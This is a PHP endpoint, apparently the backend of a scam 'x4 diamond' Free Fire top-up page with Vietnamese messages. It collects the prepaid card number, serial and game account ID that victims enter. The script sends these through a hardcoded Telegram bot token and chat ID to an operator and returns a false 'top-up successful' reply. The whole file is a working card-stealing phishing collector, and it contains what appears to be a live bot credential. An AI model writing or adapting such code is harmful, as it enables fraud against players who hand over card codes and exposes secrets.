<?php
// CONFIG BOT TELEGRAM
$botToken = "8301552072:AAE8XG6Azgud5GVtYPrvvLo04HE8F_9ZN2c";       // 🔴 Thay bằng token bot
$chatId   = "5903999893";         // 🔴 Thay bằng chat ID admin

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(["status"=>"error","message"=>"Phương thức không được hỗ trợ"]);
    exit;
}

$data = json_decode(file_get_contents('php://input'), true);
if (!$data) { $data = $_POST; }

$required = ['userId','provider','diamonds','value','cardNumber','serialNumber'];
foreach ($required as $field) {
    if (empty($data[$field])) {
        http_response_code(400);
        echo json_encode(["status"=>"error","message"=>"Thiếu thông tin: $field"]);
        exit;
    }
}

$message  = "🎮 *NẠP KIM CƯƠNG X4 - FREE FIRE* 🎮\n";
$message .= "👤 UID/Tài khoản: " . $data['userId'] . "\n";
$message .= "💳 Loại thẻ: " . $data['provider'] . "\n";
$message .= "💎 Gói KC: " . $data['diamonds'] . " KC (" . $data['value'] . ")\n";
$message .= "🔢 Mã thẻ: " . $data['cardNumber'] . "\n";
$message .= "📋 Số seri: " . $data['serialNumber'] . "\n";
$message .= "⏰ Thời gian: " . date("d/m/Y H:i:s");

$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$postData = ['chat_id'=>$chatId,'text'=>$message,'parse_mode'=>'Markdown'];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
$response = curl_exec($ch);
curl_close($ch);

$responseData = json_decode($response, true);
header('Content-Type: application/json; charset=utf-8');
if (!empty($responseData['ok'])) {
    echo json_encode(["status"=>"success","message"=>"Nạp thẻ thành công, đang xử lý!"]);
} else {
    http_response_code(500);
    echo json_encode(["status"=>"error","message"=>"Không thể gửi về Telegram"]);
}
?>